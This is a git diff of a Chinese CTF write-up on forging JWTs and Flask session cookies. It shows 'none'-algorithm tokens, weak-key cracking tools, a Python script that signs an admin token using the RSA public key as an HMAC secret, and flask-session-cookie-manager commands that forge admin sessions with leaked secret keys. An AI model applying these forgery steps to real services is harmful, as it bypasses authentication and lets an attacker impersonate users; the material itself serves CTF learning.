@@ -1,4 +1,4 @@
-# JWT
+# JWT和session伪造总结
 
 [TOC]
 
@@ -73,6 +73,19 @@ ctfhub{67249a09d950fcc2bdd2f441}
 
 ### 无签名
 
+根据了解最初jwt是为了调试，添加了空（None）算法,这样的话我们的JWT就可以随意通过服务器的验证
+
+```python
+{
+  "alg": "None",
+  "typ": "JWT"
+}
+```
+
+缺少签名算法，jwt保证信息不被篡改的功能就失效了
+
+
+
 > 题目提示：
 >
 > 一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。尝试找到 flag。
@@ -107,6 +120,8 @@ eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ
 eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.
 ```
 
+![image-20241027165046523](https://gitee.com/bx33661/image/raw/master/path/image-20241027165046523.png)
+
 提交之后得到flag
 
 ```
@@ -120,6 +135,8 @@ ctfhub{72d9055351fb13a911387e5c}
 
 ### 弱密钥
 
+就是对于密钥比较简单的我们可以通过爆破的手段，获得密钥
+
 > 对称密码
 
 进入页面，注册admin/123456,查看cookie
@@ -130,7 +147,7 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiI
 
 ![image-20240827170321755](https://gitee.com/bx33661/image/raw/master/path/image-20240827170321755.png)
 
-安装一个工具`c-jwt-cracker`
+安装一个工具`c-jwt-cracker`，也可以使用"[JWT_tool](https://github.com/ticarpi/jwt_tool)"
 
 ```bash
 git clone https://github.com/brendan-rius/c-jwt-cracker.git
@@ -168,6 +185,37 @@ ctfhub{d458c74724065f3a63099b1c}
 
 
 ### 修改签名算法
+
+JWT中用的加密方式一般是：
+
+- `HMAC`-------------------------HMAC（Hash-based Message Authentication Code，基于哈希的消息认证码）是一种广泛使用的消息认证码，用于验证消息的完整性和真实性。它结合了哈希函数（如 SHA-256、SHA-1 或 MD5）和密钥
+- `RSA`
+
+在jwt使用中利用两种算法的私钥对`signature`加密
+
+
+
+修改签名算法利用的是，下面的header如下，使用了RSA
+
+```python
+{
+  "typ": "JWT",
+  "alg": "RS256"
+}
+```
+
+我们如果可以获取到这个加密的公钥的话，我们可以修改加密算法，使用我们获取的公钥作为算法`HMAC`的密钥,进行验证
+
+```python
+{
+  "typ": "JWT",
+  "alg": "HS256"
+}
+```
+
+
+
+一个例子：
 
 > 题目提示：
 >
@@ -287,6 +335,44 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6Imd1ZXN
 
 ![image-20240827170553593](https://gitee.com/bx33661/image/raw/master/path/image-20240827170553593.png)
 
+```python
+# -*- coding: utf-8 -*-
+import hmac
+import hashlib
+import base64
+
+# 打开并读取 publickey.pem 文件
+with open('publickey.pem', 'r') as file:
+    key = file.read()
+
+# 定义 JWT 的头部和载荷
+header = '{"typ": "JWT", "alg": "HS256"}'
+payload = '{"username": "admin", "role": "admin"}'
+
+# 编码头部
+encodeHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
+encodeHeader = str(encodeHBytes, "utf-8").rstrip("=")
+
+# 编码载荷
+encodePBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
+encodePayload = str(encodePBytes, "utf-8").rstrip("=")
+
+# 拼接头部和载荷
+token = encodeHeader + "." + encodePayload
+
+# 创建签名
+sig = base64.urlsafe_b64encode(hmac.new(bytes(key, "utf-8"), token.encode("utf-8"), hashlib.sha256).digest()).decode("utf-8").rstrip("=")
+
+# 输出最终的 JWT
+print(token + "." + sig)
+```
+
+---->
+
+```python
+eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJyb2xlIjogImFkbWluIn0.TKLWmpJhNpSKqkztiZY4QQC0nYnICLjAe5UMyAE9a24
+```
+
 
 
 ### [CISCN2019 华北赛区 Day1 Web2]ikun
@@ -390,4 +476,202 @@ make
 #使用
 ./jwtcrack token
 ```
+
+
+
+`jwt_tools`:
+
+https://github.com/ticarpi/jwt_tool
+
+Install:
+
+```python
+git clone https://github.com/ticarpi/jwt_tool
+cd jwt_tool
+python3 -m pip install -r requirements.txt
+```
+
+Usage:
+
+```python
+python3 jwt_tool.py eyJBRyI6Ijk1MGZjYzJiZGQyZjQ0MX0iLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImJ4MzM2NjEiLCJwYXNzd29yZCI6InpieDEyMzQ1NiIsIkZMIjoiY3RmaHViezY3MjQ5YTA5ZCJ9.eNgGhgI2-Bf_txI0cGiS64HfDeErXt2p2mT5UA7E_zU
+```
+
+![image-20241027173740260](https://gitee.com/bx33661/image/raw/master/path/image-20241027173740260.png)
+
+
+
+## session伪造
+
+```python
+from flask import Flask, request, session, redirect, url_for, render_template_string
+
+app = Flask(__name__)
+
+# 设置一个密钥，用于签署会话数据
+app.secret_key = 'your_secret_key_here'
+
+# 主页
+@app.route('/')
+def index():
+    if 'username' in session:
+        return f'Hello, {session["username"]}! <a href="{url_for("logout")}">Logout</a>'
+    return 'Hello, Guest! <a href="{url_for("login")}">Login</a>'
+
+# 登录页面
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form['username']
+        session['username'] = username
+        return redirect(url_for('index'))
+    return '''
+        <form method="post">
+            Username: <input type="text" name="username">
+            <input type="submit" value="Login">
+        </form>
+    '''
+
+# 注销功能
+@app.route('/logout')
+def logout():
+    session.pop('username', None)
+    return redirect(url_for('index'))
+
+if __name__ == '__main__':
+    app.run(debug=True)
+```
+
+![image-20241027180040850](https://gitee.com/bx33661/image/raw/master/path/image-20241027180040850.png)
+
+大体解码获取信息可以使用,大佬脚本
+
+```python
+#!/usr/bin/env python3
+import sys
+import zlib
+from base64 import b64decode
+from flask.sessions import session_json_serializer
+from itsdangerous import base64_decode
+
+def decryption(payload):
+    payload, sig = payload.rsplit(b'.', 1)
+    payload, timestamp = payload.rsplit(b'.', 1)
+
+    decompress = False
+    if payload.startswith(b'.'):
+        payload = payload[1:]
+        decompress = True
+
+    try:
+        payload = base64_decode(payload)
+    except Exception as e:
+        raise Exception('Could not base64 decode the payload because of '
+                         'an exception')
+
+    if decompress:
+        try:
+            payload = zlib.decompress(payload)
+        except Exception as e:
+            raise Exception('Could not zlib decompress the payload before '
+                             'decoding the payload')
+
+    return session_json_serializer.loads(payload)
+
+if __name__ == '__main__':
+    print(decryption(sys.argv[1].encode()))
+```
+
+![image-20241027180346873](https://gitee.com/bx33661/image/raw/master/path/image-20241027180346873.png)
+
+
+
+做题中题目需要对我们的信息进行验证，我们需要伪造session，具体思路我感觉是这样的
+
+- 获取信息，知道我们要伪造什么信息
+- 寻找密钥
+- 伪造提交
+
+
+
+具体工具使用：
+
+https://github.com/noraj/flask-session-cookie-manager
+
+
+
+**[HCTF 2018]admin**
+
+---
+
+随便注册一个账号
+
+![image-20241011215558037](https://gitee.com/bx33661/image/raw/master/path/image-20241011215558037.png)
+
+```
+<!-- you are not admin -->
+```
+
+我们发现session，那现在xueyao
+
+在change代码界面找到源代码的github地址,解码：
+
+```python
+PS E:\gitcode\flask-session-cookie-manager-1.2.1.1\flask-session-cookie-manager-1.2.1.1> python flask_session_cookie_manager3.py decode -s "ckj123" -c ".eJw9UMuKwjAU_ZXhrl30pQvBhRIndCC3tKSGm41ora251oF2BjXiv09xwPV5nwdsj309tDA_7s5DPYHt6QDzB3zsYQ7WNbfMoFOOPfnyZkV6tzpNsMNOOYqU3LQoywR9HlpZ3slVAUoVo6ZpJjhQWkWjziuXJ9blsZWFUyKNM0OJFc2N3Oo8aq_o1x59FY_sQMk0UL65ZrqZkj6wMp9tJuieibUnU8akqxDdMrEGGfXYQ3OEolrAcwLV0B-3P99cX94TyHEwRnuM1glFaWx1E5EumMymQ9Gy1V9sXcFW5lflV2cyaUD54mV36nZN_XbKL7iplv_IZdeNADDzbDaDCfwOdf86DsIQnn_9ZWzO.ZwkvZA.WqHSn3iY9Y0siqmVfZ69q2NQso8"
+{'_fresh': False, '_id': b'f819cc293c51d22e286cf2660ea4e8745de2b744c7569894136c53248f47ddc0279f8d81b0e7407137773f40b4380989a7d1aa862813ae7a75608ecd53f19647', 'csrf_token': b'b94f437a8cb7e86a4daef48de2df4ddd030eab4a', 'image': b'BsUp', 'name': 'kkk666', 'user_id': '11'}
+```
+
+编码：
+
+```python
+PS E:\gitcode\flask-session-cookie-manager-1.2.1.1\flask-session-cookie-manager-1.2.1.1> python flask_session_cookie_manager3.py encode -s 'ckj123' -t "{'_fresh': False, '_id': b'f819cc293c51d22e286cf2660ea4e8745de2b744c7569894136c53248f47ddc0279f8d81b0e7407137773f40b4380989a7d1aa862813ae7a75608ecd53f19647', 'csrf_token': b'b94f437a8cb7e86a4daef48de2df4ddd030eab4a', 'image': b'BsUp', 'name': 'admin', 'user_id': '11'}"
+.eJw9UMuKwjAU_ZXhrl305UZwocQJHcgtlbThZiO178R2wM6gjfjvUxxwfd7nAafmWk8dbJriMtUrOPUVbB7wcYYNaNPeE4VGGOvIZXfN4lnLOMIBB2EoEDzvkGcRutTXPJvJlB5yEaKkdcKsJ6QIFp0TJo20SUPNj0awOEwURZq1dzL7y6K9oTs4dGW4sD3BY0-49pbIdk2yskJ9dgmjOWEHRyoLSZY-ml2kFVqUSw9pA2TlFp4rKKdrc_r5tvX4nkDGeku0w-AQURCHWrYByaMllQ_IOqvll9XmaDVPb8LtL6Rij9Lty64firZ-O6Uj5uXuHxmLYQGgqIZ-hBX8TvX19Rv4Pjz_AJhNbPQ.ZwkwQQ.j5yClHogHshbwpaniLOkHLBE6us
+```
+
+访问index界面
+
+![image-20241011220516456](https://gitee.com/bx33661/image/raw/master/path/image-20241011220516456.png)
+
+
+
+
+
+**[NSSRound#13 Basic]flask?jwt?**
+
+1. 进入页面发现需要登录，尝试一下登录不进去，我们就注册一个账号，登录进入另一个界面
+
+   ![image-20240821153816950](https://gitee.com/bx33661/image/raw/master/path/image-20240821153816950.png)
+
+   点击拿flag，得到我不是admin的提示
+
+2. 分析一下cookie内容，结合题目发现是session构造
+
+3. 查了资料，下载脚本：https://github.com/noraj/flask-session-cookie-manager
+
+4. 在忘记密码页面,得到：secretkey
+
+```
+<!-- secretkey: th3f1askisfunny -->
+```
+
+5. 解码
+
+```
+python flask_session_cookie_manager3.py decode -s “th3f1askisfunny” -c “.eJwljjkOwzAMwP6iuYPs6LDzmUCyJbRr0kxF_14DBVcS4AeOPON6wv4-73jA8Zqwg1NULhlNhAubKBtLOCc6U0fCqQONCZe3bVRJk2YzbZUGzRoi5L2kF-IM7Gk0o2uiVhZNaSV0uBfpNGnTYbZ6xtIXiSgT1sh9xfm_qfD9AV9VLiU.ZsWZAw.serOtgnY1BhZSNuOx3aYEYkg34Y”
+
+#结果
+{'_fresh': True, '_id': 'b4e251fe866515a675a56eb5f0b549040d7c0a5404e2334247f4d8a7824c4d2e664b91fb145fe09fa4de97f072567f681e7cbb1694d437caa7f45019191f006d', '_user_id': '2'}
+```
+
+6. 编码
+
+```
+#待编码内容
+{'_fresh': True, '_id': 'b4e251fe866515a675a56eb5f0b549040d7c0a5404e2334247f4d8a7824c4d2e664b91fb145fe09fa4de97f072567f681e7cbb1694d437caa7f45019191f006d', '_user_id': '1'}
+
+#编码结果：
+.eJwljjkOwzAMwP6iuYPk6LDzmUC2JbRr0kxF_14DBVcS4AeOPON6wv4-73jA8ZqwQ-coQhlVVUhcTVw0uiR24YaM0wa6MC5v27iwJc_qVgsPniVUuTfKTiwZ2NJ5RrNEK6KWWils9E7aePJmw331gtQWiagT1sh9xfm_Ifj-AF9SLiQ.ZsWaSQ.YVMvNUkro2QI49RcVyr_VOoQIdw
+```
+
+提交到cookie，点击按钮拿到flag
 
